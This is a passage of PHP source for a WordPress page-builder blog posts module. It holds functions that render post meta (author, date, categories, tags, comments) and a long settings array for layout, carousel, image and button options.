            <?php _e( 'By', 'uabb' ); ?><span class="uabb-posted-by"> <a class="url fn n" href="<?php echo get_author_posts_url( $obj->post_author ); ?>"><?php

                $author = ( get_the_author_meta( 'display_name', $obj->post_author ) != '' ) ? get_the_author_meta( 'display_name', $obj->post_author ) : get_the_author_meta( 'user_nicename', $obj->post_author );

                echo $author; ?></a>
            </span> 
            <?php
        }
        $html = ob_get_contents();
        ob_end_clean();
        return $html;
    }


    /**
     * @method render_date_section
     * @protected
     */
    protected function render_date_section( $obj ) {

        $show_date = ( isset( $this->settings->show_date ) ) ? $this->settings->show_date : 'yes';
        $date_format = ( isset( $this->settings->date_format ) ) ? $this->settings->date_format : 'M j, Y';

        ob_start();

        if( $show_date == 'yes' ){
        ?>
            <span class="uabb-meta-date"><?php echo date_i18n( $date_format, strtotime( $obj->post_date ) ); ?>
            </span>
        <?php
        }

        $html = ob_get_contents();
        ob_end_clean();
        return $html;
    }


    /**
     * @method render_taxonomy_section
     * @protected
     */
    protected function render_taxonomy_section( $obj ) {
        $show_categories = ( isset( $this->settings->show_categories ) ) ? $this->settings->show_categories : 'no';
        $show_tags = ( isset( $this->settings->show_tags ) ) ? $this->settings->show_tags : 'no';

        ob_start();

        if( $show_categories == 'yes' ) {
            $post_type = ( isset( $this->settings->post_type ) ) ? $this->settings->post_type : 'post';
            $object_taxonomies = get_object_taxonomies( $post_type );
            if( !empty( $object_taxonomies ) ) {
                $category_detail = wp_get_post_terms( $obj->ID, $object_taxonomies[0] );

                if( count( $category_detail ) > 0 ) {

                    for( $j = 0; $j < count( $category_detail ); $j++ ){
                ?><span class="uabb-cat-links"><a href="<?php echo get_term_link( $category_detail[$j]->term_id ); ?>" rel="category tag"><?php echo $category_detail[$j]->name; ?></a></span><?php
                        echo ( $j+1 != count( $category_detail ) ) ? trim(',&nbsp;') : '';
                    }
                }
            }
        }
        
        if( $show_tags == 'yes' ) {

            $tag_detail = get_the_tags( $obj->ID );
            if( $tag_detail != '' ) {
                echo ( count( $category_detail ) > 0 ) ? ', ' : '';
                for( $k = 0; $k < count( $tag_detail ); $k++ ){
            ?><span class="uabb-tag-links"><a href="<?php echo get_tag_link( $tag_detail[$k]->term_id ); ?>" rel="category tag"><?php echo $tag_detail[$k]->name; ?></a></span><?php
                    echo ( $k+1 != count( $tag_detail ) ) ? trim(',&nbsp;') : '';
                }
            }
        }

        $html = ob_get_contents();
        ob_end_clean();
        return $html;
    }

    /**
     * @method render_comment_section
     * @protected
     */
    protected function render_comment_section( $obj ) {
        $show_comments = ( isset( $this->settings->show_comments ) ) ? $this->settings->show_comments : 'no';

        ob_start();

        if( $show_comments == 'yes' ) {

            if( $obj->comment_count > 0 ) {
            ?><span class="uabb-comments-link"><a href="<?php echo get_permalink( $obj->ID ); ?>#comments"><?php echo $obj->comment_count; ?> <?php echo ( $obj->comment_count > 1 ) ? __( 'Comments', 'uabb' ) : __( 'Comment', 'uabb' ); ?></a></span>
            <?php
            }
        }

        $html = ob_get_contents();
        ob_end_clean();
        return $html;
    }


    /**
     * @method render_meta_section
     * @protected
     */
    protected function render_meta_section( $obj ) {

        $show_author = ( isset( $this->settings->show_author ) ) ? $this->settings->show_author : 'yes';
        $show_meta = ( isset( $this->settings->show_meta ) ) ? $this->settings->show_meta : 'yes';
        $show_categories = ( isset( $this->settings->show_categories ) ) ? $this->settings->show_categories : 'no';
        $show_tags = ( isset( $this->settings->show_tags ) ) ? $this->settings->show_tags : 'no';
        $show_comments = ( isset( $this->settings->show_comments ) ) ? $this->settings->show_comments : 'no';
        $show_date = ( isset( $this->settings->show_date ) ) ? $this->settings->show_date : 'yes';

        $output = '';

        if( $show_meta == 'yes' ) {
            if( $show_author == 'yes' || $show_categories == 'yes' || $show_tags == 'yes' || $show_comments == 'yes' || $show_date == 'yes' ) {
        ?>
                <<?php echo $this->settings->meta_tag_selection; ?> class="uabb-post-meta uabb-blog-post-section">
                <?php
                    $meta_order = explode( ',', $this->settings->meta_sort_order );

                    for( $i = 0; $i < count( $meta_order ); $i++ ) {
                        switch ( $meta_order[$i] ) {
                            case 'author':
                                $output = $this->render_author_section( $obj );
                                break;

                             case 'date':
                                $output = $this->render_date_section( $obj );
                                break;

                             case 'taxonomy':
                                $output = $this->render_taxonomy_section( $obj );
                                break;

                             case 'comment':
                                $output = $this->render_comment_section( $obj );
                                break;
                            
                            default:
                                // Nothing to do here
                                break;
                        }
                        $output_array[] = $output;
                    }
                    $meta_html = implode( ' | ' , array_filter( $output_array ) );
                    echo $meta_html;
                ?>
                </<?php echo $this->settings->meta_tag_selection; ?>>
        <?php
            }
        }
    }


    /**
     * @method render_blog_content
     */
    public function render_blog_content( $obj, $i ) {
        
        $link = apply_filters( 'uabb_blog_posts_link', get_permalink( $obj->ID ), $obj->ID );
        $show_title = ( isset( $this->settings->show_title ) ) ? $this->settings->show_title : 'yes';
        $show_excerpt = ( isset( $this->settings->show_excerpt ) ) ? $this->settings->show_excerpt : 'yes';
        $show_author = ( isset( $this->settings->show_author ) ) ? $this->settings->show_author : 'yes';
        $show_meta = ( isset( $this->settings->show_meta ) ) ? $this->settings->show_meta : 'yes';
        $show_categories = ( isset( $this->settings->show_categories ) ) ? $this->settings->show_categories : 'no';
        $show_tags = ( isset( $this->settings->show_tags ) ) ? $this->settings->show_tags : 'no';
        $show_comments = ( isset( $this->settings->show_comments ) ) ? $this->settings->show_comments : 'no';
        $show_date = ( isset( $this->settings->show_date ) ) ? $this->settings->show_date : 'yes';

        if( $show_meta == 'yes' && ( $show_author == 'yes' || $show_categories == 'yes' || $show_tags == 'yes' || $show_comments == 'yes' || $show_date == 'yes' ) ) {
            $meta_flag = true;
        } else {
            $meta_flag = false;
        }
        $img_html = '';
        if( substr( $this->settings->layout_sort_order, 0, 3 ) != 'img' && substr( $this->settings->layout_sort_order, -3 ) != 'img' ) {
            $img_html = $this->render_featured_image( 'top', $obj, $i );
        }

        if( $show_title == 'yes' || $show_excerpt == 'yes' || $this->settings->cta_type != 'none' || $meta_flag || $img_html != '' ) {
        ?>
        <div class="uabb-blog-post-content">
        <?php
            $layout_sequence = explode( ',', $this->settings->layout_sort_order );
            foreach( $layout_sequence as $sq ) {
                switch ( $sq ) {
                    case 'img' :
                        if( substr( $this->settings->layout_sort_order, 0, 3 ) != 'img' && substr( $this->settings->layout_sort_order, -3 ) != 'img' ) {
                            echo $this->render_featured_image( 'top', $obj, $i );
                        }
                        break;
                    case 'title':
                        $this->render_title_section( $obj );
                        break;

                     case 'content':
                        $this->render_content_section( $obj );
                        break;

                     case 'meta':
                        $this->render_meta_section( $obj );
                        break;

                     case 'cta':
                        $this->render_button( $link, $this->settings->link_target );
                        break;
                    
                    default:
                        // Nothing to do here
                        break;
                }
            }
        ?>
        </div>
        <?php
        }
    }
}

/**
 * Register the module and its form settings.
 */
FLBuilder::register_module('BlogPostsModule', array(
    'general'       => array( // Tab
        'title'         => __('General', 'uabb'), // Tab title
        'sections'      => array( // Tab Sections
            'general'       => array( // Section
                'title'         => '', // Section Title
                'fields'        => array(
                    'is_carousel'     => array(
                        'type'          => 'select',
                        'label'         => __( 'Post Appearance', 'uabb' ),
                        'default'       => 'grid',
                        'help' => __( 'This is how your posts you want to display.', 'uabb' ),
                        'options'       => array(
                            'carousel'  => __( 'Carousel', 'uabb' ),
                            'grid'    => __( 'Grid', 'uabb' ),
                            'feed'    => __( 'Feeds', 'uabb' ),
                            'masonary' => __( 'Masonry', 'uabb' )
                        ),
                    ),
                )
            ),
            'grid_filter' => array(
                'title' => __( 'Number of Posts to Show ', 'uabb' ),
                'fields' => array(
                    'post_per_grid' => array(
                        'type'          => 'select',
                        'label' => __('Desktop', 'uabb'),
                        'help' => __( 'This is how many grid columns you want to show.', 'uabb' ),
                        'default' => '3',
                        'options'       => array(
                            '1'      => __('1 Column', 'uabb'),
                            '2'      => __('2 Columns', 'uabb'),
                            '3'      => __('3 Columns', 'uabb'),
                            '4'      => __('4 Columns', 'uabb'),
                            '5'      => __('5 Columns', 'uabb'),
                            '6'      => __('6 Columns', 'uabb'),
                            '7'      => __('7 Columns', 'uabb'),
                            '8'      => __('8 Columns', 'uabb')
                        ),
                    ),
                    'post_per_grid_desktop' => array(
                        'type'          => 'select',
                        'label' => __('Desktop', 'uabb'),
                        'default' => '3',
                        'help' => __( 'This is how many posts you want to show at one time on desktop.', 'uabb' ),
                        'options'       => array(
                            '1'      => __('1 Column', 'uabb'),
                            '2'      => __('2 Columns', 'uabb'),
                            '3'      => __('3 Columns', 'uabb'),
                            '4'      => __('4 Columns', 'uabb'),
                            '5'      => __('5 Columns', 'uabb'),
                            '6'      => __('6 Columns', 'uabb'),
                            '7'      => __('7 Columns', 'uabb'),
                            '8'      => __('8 Columns', 'uabb')
                        ),
                    ),
                    'post_per_grid_medium' => array(
                        'type'          => 'select',
                        'label' => __('Medium Devices', 'uabb'),
                        'default' => '2',
                        'help' => __( 'This is how many posts you want to show at one time on tablet devices.', 'uabb' ),
                        'options'       => array(
                            '1'      => __('1 Column', 'uabb'),
                            '2'      => __('2 Columns', 'uabb'),
                            '3'      => __('3 Columns', 'uabb'),
                            '4'      => __('4 Columns', 'uabb'),
                            '5'      => __('5 Columns', 'uabb'),
                            '6'      => __('6 Columns', 'uabb'),
                            '7'      => __('7 Columns', 'uabb'),
                            '8'      => __('8 Columns', 'uabb')
                        ),
                    ),
                    'post_per_grid_small' => array(
                        'type'          => 'select',
                        'label' => __('Small Devices', 'uabb'),
                        'default' => '1',
                        'help' => __( 'This is how many posts you want to show at a time on mobile devices.', 'uabb' ),
                        'options'       => array(
                            '1'      => __('1 Column', 'uabb'),
                            '2'      => __('2 Columns', 'uabb'),
                            '3'      => __('3 Columns', 'uabb'),
                            '4'      => __('4 Columns', 'uabb'),
                            /*'5'      => __('5 Columns', 'uabb'),
                            '6'      => __('6 Columns', 'uabb'),
                            '7'      => __('7 Columns', 'uabb'),
                            '8'      => __('8 Columns', 'uabb')*/
                        ),
                    ),
                )
            ),
            'carousel_filter' => array(
                'title' => __( 'Carousel Filter', 'uabb' ),
                'fields' =>  array(
                    'slides_to_scroll'  => array(
                        'type'          => 'text',
                        'label'         => __('Posts to Scroll', 'uabb'),
                        'help'          => __( 'This is how many posts you want to scroll at a time.', 'uabb' ),
                        'placeholder'   => '1',
                        'size'          => '8',
                    ),
                    'autoplay'     => array(
                        'type'          => 'uabb-toggle-switch',
                        'label'         => __( 'Autoplay Post Scroll', 'uabb' ),
                        'help'          => __( 'Enables auto play of posts.', 'uabb' ),
                        'default'       => 'no',
                        'options'       => array(
                            'yes'       => __( 'Yes', 'uabb' ),
                            'no'        => __( 'No', 'uabb' ),
                        ),
                        'toggle' => array(
                            'yes' => array(
                                'fields' => array( 'animation_speed' )
                            )
                        )
                    ),
                    'animation_speed' => array(
                        'type'          => 'text',
                        'label'         => __('Autoplay Speed', 'uabb'),
                        'help'          => __( 'Enter the time interval to scroll post automatically.', 'uabb' ),
                        'placeholder'   => '1000',
                        'size'          => '8',
                        'description'   => __( 'ms', 'uabb' )
                    ),
                    'infinite_loop'     => array(
                        'type'          => 'uabb-toggle-switch',
                        'label'         => __( 'Infinite Loop', 'uabb' ),
                        'help'          => __( 'Enable this to scroll posts in infinite loop.', 'uabb' ),
                        'default'       => 'yes',
                        'options'       => array(
                            'yes'       => __( 'Yes', 'uabb' ),
                            'no'        => __( 'No', 'uabb' ),
                        ),
                    ),
                    'lazyload'     => array(
                        'type'          => 'uabb-toggle-switch',
                        'label'         => __( 'Enable Lazy Load', 'uabb' ),
                        'help'          => __( 'Enable this to load the image as soon as user slide to it.', 'uabb' ),
                        'default'       => 'no',
                        'options'       => array(
                            'yes'       => __( 'Yes', 'uabb' ),
                            'no'        => __( 'No', 'uabb' ),
                        ),
                    ),
                    'enable_arrow' => array(
                        'type'          => 'uabb-toggle-switch',
                        'label'         => __( 'Enable Arrows', 'uabb' ),
                        'help'          => __( 'Enable Next/Prev arrows to your carousel slider.', 'uabb' ),
                        'default'       => 'yes',
                        'options'       => array(
                            'yes'       => __( 'Yes', 'uabb' ),
                            'no'        => __( 'No', 'uabb' ),
                        ),
                    ),
                    'arrow_position' => array(
                        'type'          => 'select',
                        'label'         => __( 'Arrow Position', 'uabb' ),
                        'default'       => 'outside',
                        'options'       => array(
                            'outside'   => __( 'Outside', 'uabb' ),
                            'inside'    => __( 'Inside', 'uabb' ),
                        ),
                    ),
                    'arrow_style'       => array(
                        'type'          => 'select',
                        'label'         => __('Arrow Style', 'uabb'),
                        'default'       => 'circle',
                        'options'       => array(
                            'square'             => __('Square Background', 'uabb'),
                            'circle'             => __('Circle Background', 'uabb'),
                            'square-border'      => __('Square Border', 'uabb'),
                            'circle-border'      => __('Circle Border', 'uabb')
                        ),
                        'toggle'        => array(
                            'square-border' => array(
                                'fields'        => array( 'arrow_color', 'arrow_color_border', 'arrow_border_size' )
                            ),
                            'circle-border' => array(
                                'fields'        => array( 'arrow_color', 'arrow_color_border', 'arrow_border_size' )
                            ),
                            'square' => array(
                                'fields'        => array( 'arrow_color', 'arrow_background_color', 'arrow_background_color_opc' )
                            ),
                            'circle' => array(
                                'fields'        => array( 'arrow_color', 'arrow_background_color', 'arrow_background_color_opc' )
                            ),
                        )
                    ),
                    'arrow_color' => array( 
                        'type'       => 'color',
                        'label'         => __('Arrow Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                    ),
                    'arrow_background_color' => array( 
                        'type'       => 'color',
                        'label'         => __('Arrow Background Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                    ),
                    'arrow_background_color_opc' => array( 
                        'type'        => 'text',
                        'label'       => __('Opacity', 'uabb'),
                        'default'     => '',
                        'description' => '%',
                        'maxlength'   => '3',
                        'size'        => '5',
                    ),
                    'arrow_color_border' => array( 
                        'type'       => 'color',
                        'label'         => __('Arrow Border Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                    ),
                    'arrow_border_size'       => array(
                        'type'          => 'text',
                        'label'         => __('Border Size', 'uabb'),
                        'default'       => '1',
                        'description'   => 'px',
                        'size'          => '8',
                        'max_lenght'    => '3'
                    ),
                )
            ),
        )
    ),
    'post_type_filter' => array(
        'title'         => __('Query', 'uabb'),
        'file'          => plugin_dir_path( __FILE__ ) . 'includes/loop-settings.php',
    ),
    'uabb_controls' => array(
        'title'         => __('Controls', 'uabb'),
        'sections'          => array(
            'image_settings' => array(
                'title' => __( 'Featured Image', 'uabb' ),
                'fields' => array(
                    'show_featured_image' => array(
                        'type'          => 'uabb-toggle-switch',
                        'label'         => __( 'Display Featured Image', 'uabb' ),
                        'help'          => __('Enable this to display featured image of posts in a module.', 'uabb'),
                        'default'       => 'yes',
                        'options'       => array(
                            'yes'       => __( 'Yes', 'uabb' ),
                            'no'        => __( 'No', 'uabb' ),
                        ),
                    ),
                    'featured_image_size' => array(
                        'type'          => 'select',
                        'label'         => __( 'Featured Image Size', 'uabb' ),
                        'default'       => 'medium',
                        'help'          => __( 'Select featured image size. *For custom size - please clear page builder cache to take changes in effect.', 'uabb' ),
                        'options'       => apply_filters('uabb_blog_posts_featured_image_sizes', array(
                                'full' => __( 'Full', 'uabb' ),
                                'large' => __( 'Large', 'uabb' ),
                                'medium' => __( 'Medium', 'uabb' ),
                                'thumbnail' => __( 'Thumbnail', 'uabb' ),
                                'custom' => __( 'Custom', 'uabb' ),
                            )
                        ),
                    ),
                    'featured_image_size_width' => array(
                        'type'          => 'text',
                        'label'         => __( 'Custom Image Width', 'uabb' ),
                        'description'   => 'px',
                        'size'          => '8'
                    ),
                    'featured_image_size_height' => array(
                        'type'          => 'text',
                        'label'         => __( 'Custom Image Height', 'uabb' ),
                        'description'   => 'px',
                        'size'          => '8'
                    ),
                )
            ),
            'title_settings' => array(
                'title' => __( 'Title', 'uabb' ),
                'fields' => array(
                    'show_title' => array(
                        'type'          => 'uabb-toggle-switch',
                        'label'         => __( 'Display Title', 'uabb' ),
                        'help'          => __('Enable this to display title of posts in a module.', 'uabb'),
                        'default'       => 'yes',
                        'options'       => array(
                            'yes'       => __( 'Yes', 'uabb' ),
                            'no'        => __( 'No', 'uabb' ),
                        ),
                        'toggle' => array(
                            'yes' => array(
                                'sections' => array( 'title_typography' )
                            )
                        )
                    ),
                )
            ),
            'meta_settings' => array(
                'title' => __( 'Post Meta', 'uabb' ),
                'fields' => array(
                    'show_meta' => array(
                        'type'          => 'uabb-toggle-switch',
                        'label'         => __( 'Display Meta Information', 'uabb' ),
                        'help'          => __('Enable this to display post meta information in a module.', 'uabb'),
                        'default'       => 'yes',
                        'options'       => array(
                            'yes'       => __( 'Yes', 'uabb' ),
                            'no'        => __( 'No', 'uabb' ),
                        ),
                        'toggle'    => array(
                            'yes'    => array(
                                /*'fields'    => array( 'show_author', 'show_date', 'show_categories', 'show_tags', 'show_comments' ),*/
                                'sections' => array( 'meta_typography' )
                            )
                        ),
                    ),
                    'show_author' => array(
                        'type'          => 'uabb-toggle-switch',
                        'label'         => __( 'Show Author', 'uabb' ),
                        'default'       => 'yes',
                        'options'       => array(
                            'yes'       => __( 'Yes', 'uabb' ),
                            'no'        => __( 'No', 'uabb' ),
                        ),
                    ),
                    'show_date' => array(
                        'type'          => 'uabb-toggle-switch',
                        'label'         => __( 'Show Date', 'uabb' ),
                        'default'       => 'yes',
                        'options'       => array(
                            'yes'       => __( 'Yes', 'uabb' ),
                            'no'        => __( 'No', 'uabb' ),
                        ),
                        'toggle' => array(
                            'yes' => array(
                                'fields' => array( 'date_format' )
                            )
                        )
                    ),
                    'date_format' => array(
                        'type'          => 'select',
                        'label'         => __('Date Format', 'uabb'),
                        'default'       => 'M j, Y',
                        'options'       => array(
                            'M j, Y'        => date_i18n('M j, Y'),
                            'F j, Y'        => date_i18n('F j, Y'),
                            'm/d/Y'         => date_i18n('m/d/Y'),
                            'm-d-Y'         => date_i18n('m-d-Y'),
                            'm.d.Y'         => date_i18n('m.d.Y'),
                            'd M Y'         => date_i18n('d M Y'),
                            'd F Y'         => date_i18n('d F Y'),
                            'd-m-Y'         => date_i18n('d-m-Y'),
                            'd.m.Y'         => date_i18n('d.m.Y'),
                            'd/m/Y'         => date_i18n('d/m/Y'),
                            'Y-m-d'         => date_i18n('Y-m-d'),
                            'Y.m.d'         => date_i18n('Y.m.d'),
                            'Y/m/d'         => date_i18n('Y/m/d'),
                        )
                    ),
                    'show_categories' => array(
                        'type'          => 'uabb-toggle-switch',
                        'label'         => __( 'Show Categories', 'uabb' ),
                        'default'       => 'no',
                        'options'       => array(
                            'yes'       => __( 'Yes', 'uabb' ),
                            'no'        => __( 'No', 'uabb' ),
                        ),
                    ),
                    'show_tags' => array(
                        'type'          => 'uabb-toggle-switch',
                        'label'         => __( 'Show Tags', 'uabb' ),
                        'default'       => 'no',
                        'options'       => array(
                            'yes'       => __( 'Yes', 'uabb' ),
                            'no'        => __( 'No', 'uabb' ),
                        ),
                    ),
                    'show_comments' => array(
                        'type'          => 'uabb-toggle-switch',
                        'label'         => __( 'Show Comments', 'uabb' ),
                        'default'       => 'no',
                        'options'       => array(
                            'yes'       => __( 'Yes', 'uabb' ),
                            'no'        => __( 'No', 'uabb' ),
                        ),
                    ),
                )
            ),
            'excerpt_settings' => array(
                'title' => __( 'Content', 'uabb' ),
                'fields' => array(
                    'show_excerpt' => array(
                        'type'          => 'uabb-toggle-switch',
                        'label'         => __( 'Display Content', 'uabb' ),
                        'help'          => __('Enable this to display content of posts in a module.', 'uabb'),
                        'default'       => 'yes',
                        'options'       => array(
                            'yes'       => __( 'Yes', 'uabb' ),
                            'no'        => __( 'No', 'uabb' ),
                        ),
                    ),
                    'content_type' => array(
                        'type'          => 'select',
                        'label'         => __( 'Content Type', 'uabb' ),
                        'default'       => 'excerpt',
                        'options'       => array(
                            'excerpt'   => __( 'Excerpt', 'uabb' ),
                            'content'   => __( 'Full Content', 'uabb' ),
                            'custom'    => __( 'Custom Word Count', 'uabb' ),
                        ),
                        'toggle'    => array(
                            'custom'    => array(
                                'fields' => array( 'excerpt_count' )
                            )
                        )
                    ),
                    'excerpt_count' => array(
                        'type'      => 'text',
                        'label'     => __('Excerpt Count', 'uabb'),
                        'help'      => __('Enter the value to limit post content words. Keep it empty for default excerpt', 'uabb'),
                        'default'   => '18',
                        'size'      => '8',
                    ),
                )
            ),
            'cta'           => array(
                'title'         => __('Call to Action', 'uabb'),
                'fields'        => array(
                    'cta_type'      => array(
                        'type'          => 'select',
                        'label'         => __('Type', 'uabb'),
                        'help'          => __( 'Select the call to action type for your posts.', 'uabb' ),
                        'default'       => 'link',
                        'options'       => array(
                            'none'          => _x( 'None', 'Call to action.', 'uabb' ),
                            'link'          => __('Text', 'uabb'),
                            'button'        => __('Button', 'uabb'),
                        ),
                        'toggle'        => array(
                            'none'          => array(),
                            'link'          => array(
                                'fields'        => array( 'cta_text', 'link_target' ),
                                'sections'      => array( 'link_typography' )
                            ),
                            'button'        => array(
                                'sections'      => array( 'btn-colors', 'btn-icon', 'btn-style', 'btn-structure', 'btn_typography'),
                                'fields' => array( 'btn_text', 'link_target' )
                            ),

                        )
                    ),
                    'cta_text'      => array(
                        'type'          => 'text',
                        'label'         => __('Enter Text', 'uabb'),
                        'help'          => __( 'Enter the text for your call to action link.', 'uabb' ),
                        'default'       => __('Read More', 'uabb'),
                    ),
                    'btn_text'          => array(
                        'type'          => 'text',
                        'label'         => __('Enter Text', 'uabb'),
                        'help'          => __( 'Enter the text for your call to action button.', 'uabb' ),
                        'default'       => __('Click Here', 'uabb'),
                    ),
                    'link_target'   => array(
                        'type'          => 'select',
                        'label'         => __('Link Target', 'uabb'),
                        'help'          => __( 'Controls where CTA link will open after click.', 'uabb' ),
                        'default'       => '_self',
                        'options'       => array(
                            '_self'         => __('Same Window', 'uabb'),
                            '_blank'        => __('New Window', 'uabb')
                        ),
                        'preview'       => array(
                            'type'          => 'none'
                        )
                    )
                )
            ),
            'btn-style'      => array(
                'title'         => __('Style', 'uabb'),
                'fields'        => array(
                    'btn_style'         => array(
                        'type'          => 'select',
                        'label'         => __('Style', 'uabb'),
                        'default'       => 'flat',
                        'class'         => 'creative_button_styles',
                        'options'       => array(
                            'flat'          => __('Flat', 'uabb'),
                            'gradient'      => __('Gradient', 'uabb'),
                            'transparent'   => __('Transparent', 'uabb'),
                            'threed'        => __('3D', 'uabb'),
                        ),
                    ),
                    'btn_border_size'   => array(
                        'type'          => 'text',
                        'label'         => __('Border Size', 'uabb'),
                        'description'   => 'px',
                        'maxlength'     => '3',
                        'size'          => '5',
                        'placeholder'   => '2'
                    ),
                    'btn_transparent_button_options'         => array(
                        'type'          => 'select',
                        'label'         => __('Hover Styles', 'uabb'),
                        'default'       => 'transparent-fade',
                        'options'       => array(
                            'none'          => __('None', 'uabb'),
                            'transparent-fade'          => __('Fade Background', 'uabb'),
                            'transparent-fill-top'      => __('Fill Background From Top', 'uabb'),
                            'transparent-fill-bottom'      => __('Fill Background From Bottom', 'uabb'),
                            'transparent-fill-left'     => __('Fill Background From Left', 'uabb'),
                            'transparent-fill-right'     => __('Fill Background From Right', 'uabb'),
                            'transparent-fill-center'       => __('Fill Background Vertical', 'uabb'),
                            'transparent-fill-diagonal'     => __('Fill Background Diagonal', 'uabb'),
                            'transparent-fill-horizontal'  => __('Fill Background Horizontal', 'uabb'),
                        ),
                    ),
                    'btn_threed_button_options'         => array(
                        'type'          => 'select',
                        'label'         => __('Hover Styles', 'uabb'),
                        'default'       => 'threed_down',
                        'options'       => array(
                            'threed_down'          => __('Move Down', 'uabb'),
                            'threed_up'      => __('Move Up', 'uabb'),
                            'threed_left'      => __('Move Left', 'uabb'),
                            'threed_right'     => __('Move Right', 'uabb'),
                            'animate_top'     => __('Animate Top', 'uabb'),
                            'animate_bottom'     => __('Animate Bottom', 'uabb'),
                            /*'animate_left'     => __('Animate Left', 'uabb'),
                            'animate_right'     => __('Animate Right', 'uabb'),*/
                        ),
                    ),
                    'btn_flat_button_options'         => array(
                        'type'          => 'select',
                        'label'         => __('Hover Styles', 'uabb'),
                        'default'       => 'none',
                        'options'       => array(
                            'none'          => __('None', 'uabb'),
                            'animate_to_left'      => __('Appear Icon From Right', 'uabb'),
                            'animate_to_right'          => __('Appear Icon From Left', 'uabb'),
                            'animate_from_top'      => __('Appear Icon From Top', 'uabb'),
                            'animate_from_bottom'     => __('Appear Icon From Bottom', 'uabb'),
                        ),
                    ),
                )
            ),
            'btn-icon'       => array( // Section
                'title'         => __('Icons', 'uabb'),
                'fields'        => array(
                    'btn_icon'          => array(
                        'type'          => 'icon',
                        'label'         => __('Icon', 'uabb'),
                        'show_remove'   => true
                    ),
                    'btn_icon_position' => array(
                        'type'          => 'select',
                        'label'         => __('Icon Position', 'uabb'),
                        'default'       => 'before',
                        'options'       => array(
                            'before'        => __('Before Text', 'uabb'),
                            'after'         => __('After Text', 'uabb')
                        )
                    )
                )
            ),
            'btn-colors'     => array( // Section
                'title'         => __('Colors', 'uabb'),
                'fields'        => array(
                    'btn_text_color'        => array( 
                        'type'       => 'color',
                        'label'      => __('Text Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                    ),
                    'btn_text_hover_color'        => array( 
                        'type'       => 'color',
                        'label'      => __('Text Hover Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                        'preview'       => array(
                            'type'          => 'none'
                        )
                    ),
                    'btn_bg_color'        => array( 
                        'type'       => 'color',
                        'label'      => __('Background Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                    ),
                    'btn_bg_color_opc'    => array( 
                        'type'        => 'text',
                        'label'       => __('Opacity', 'uabb'),
                        'default'     => '',
                        'description' => '%',
                        'maxlength'   => '3',
                        'size'        => '5',
                    ),

                    'btn_bg_hover_color'        => array( 
                        'type'       => 'color',
                        'label'         => __('Background Hover Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                        'preview'       => array(
                            'type'          => 'none'
                        )
                    ),
                    'btn_bg_hover_color_opc'    => array( 
                        'type'        => 'text',
                        'label'       => __('Opacity', 'uabb'),
                        'default'     => '',
                        'description' => '%',
                        'maxlength'   => '3',
                        'size'        => '5',
                    ),
                    'hover_attribute' => array(
                        'type'          => 'uabb-toggle-switch',
                        'label'         => __( 'Apply Hover Color To', 'uabb' ),
                        'default'       => 'bg',
                        'options'       => array(
                            'border'    => __( 'Border', 'uabb' ),
                            'bg'        => __( 'Background', 'uabb' ),
                        ),
                        'width' => '75px'
                    ),
                )
            ),
            'btn-structure'  => array(
                'title'         => __('Structure', 'uabb'),
                'fields'        => array(
                    'btn_width'         => array(
                        'type'          => 'select',
                        'label'         => __('Width', 'uabb'),
                        'default'       => 'auto',
                        'options'       => array(
                            'auto'          => _x( 'Auto', 'Width.', 'uabb' ),
                            'full'          => __('Full Width', 'uabb'),
                            'custom'        => __('Custom', 'uabb')
                        ),
                        'toggle'        => array(
                            'auto'          => array(
                                'fields'        => array('btn_align', 'btn_mob_align')
                            ),
                            'full'          => array(
                                'fields'        => array( )
                            ),
                            'custom'        => array(
                                'fields'        => array('btn_align', 'btn_mob_align', 'btn_custom_width', 'btn_custom_height', 'btn_padding_top_bottom', 'btn_padding_left_right' )
                            )
                        )
                    ),
                    'btn_custom_width'  => array(
                        'type'          => 'text',
                        'label'         => __('Custom Width', 'uabb'),
                        'default'       => '200',
                        'maxlength'     => '3',
                        'size'          => '4',
                        'description'   => 'px'
                    ),
                    'btn_custom_height'  => array(
                        'type'          => 'text',
                        'label'         => __('Custom Height', 'uabb'),
                        'default'       => '45',
                        'maxlength'     => '3',
                        'size'          => '4',
                        'description'   => 'px'
                    ),
                    'btn_padding_top_bottom'       => array(
                        'type'          => 'text',
                        'label'         => __('Padding Top/Bottom', 'uabb'),
                        'placeholder'   => '0',
                        'maxlength'     => '3',
                        'size'          => '4',
                        'description'   => 'px'
                    ),
                    'btn_padding_left_right'       => array(
                        'type'          => 'text',
                        'label'         => __('Padding Left/Right', 'uabb'),
                        'placeholder'   => '0',
                        'maxlength'     => '3',
                        'size'          => '4',
                        'description'   => 'px'
                    ),
                    'btn_border_radius' => array(
                        'type'          => 'text',
                        'label'         => __('Round Corners', 'uabb'),
                        'maxlength'     => '3',
                        'size'          => '4',
                        'description'   => 'px'
                    ),
                )
            ),
        ),
    ),
    'layout'    => array(
        'title'         => __('Layout', 'uabb'), // Tab title
        'sections'      => array( // Tab Section
            'post_styles' => array(
                'title' => __( 'Post Layout Sort Order', 'uabb' ),
                'fields' => array(
                    'blog_image_position' => array(
                        'type'          => 'select',
                        'label'         => __('Image Position', 'uabb'),
                        'default'       => 'top',
                        'options'       => array(
                            'top'           => __('Stacked', 'uabb'),
                            /*'bottom'        => __('Bottom', 'uabb'),*/
                            'left'          => __('Left', 'uabb'),
                            'right'         => __('Right', 'uabb'),
                            'background'    => __('Background', 'uabb'),
                        ),
                        'toggle' => array(
                            'background' => array(
                                'fields' => array( 'overlay_color', 'overlay_color_opc' )
                            )
                        )
                    ),
                    'overlay_color' => array( 
                        'type'       => 'color',
                        'label'         => __('Overlay Color', 'uabb'),
                        'default'    => '',
                        'show_reset' => true,
                    ),
                    'overlay_color_opc' => array( 
                        'type'        => 'text',
                        'label'       => __('Opacity', 'uabb'),
                        'default'     => '',
                        'description' => '%',
                        'maxlength'   => '3',
                        'size'        => '5',
                    ),
                    'layout_sort_order' => array(
                        'type' => 'uabb-sortable',
                        'label' => __('', 'uabb'),
                        'default' => 'img,title,meta,content,cta',
                        'options' => array(
                            'img' => __('Featured Image','uabb'),
                            'title' => __('Title', 'uabb'),
                            'meta' => __('Meta', 'uabb'),
                            'content' => __('Content', 'uabb'),
                            'cta' => __('CTA', 'uabb'),
                        ),
                    ),
                )
            ),
            'meta_sort_order' => array(
